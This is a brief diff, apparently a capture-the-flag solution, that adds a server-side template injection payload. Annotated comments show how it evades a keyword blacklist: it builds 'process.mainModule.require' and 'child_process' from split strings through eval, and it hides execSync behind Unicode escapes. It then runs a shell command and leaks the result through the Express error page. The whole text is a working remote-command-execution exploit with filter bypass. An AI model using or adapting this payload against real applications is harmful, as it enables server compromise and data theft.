@@ -1,0 +1,12 @@
+{%
+  // Build sensitive names without tripping the blacklist
+  var r = eval( ('pro'+'cess') + '.' + ('main'+'Module') + '.' + ('req'+'uire') );
+  var cp = r( 'chi' + 'ld_pr' + 'ocess' );
+
+  // Call execSync without the literal "exec" (use Unicode escapes in the identifier)
+  // ex\u0065cSyn\u0063 === execSync
+  var out = cp.ex\u0065cSyn\u0063( '/' + ('get') + ('fl'+'ag') ).toString();
+
+  // Make Express print it in the error page
+  throw new Error(out);
+%}
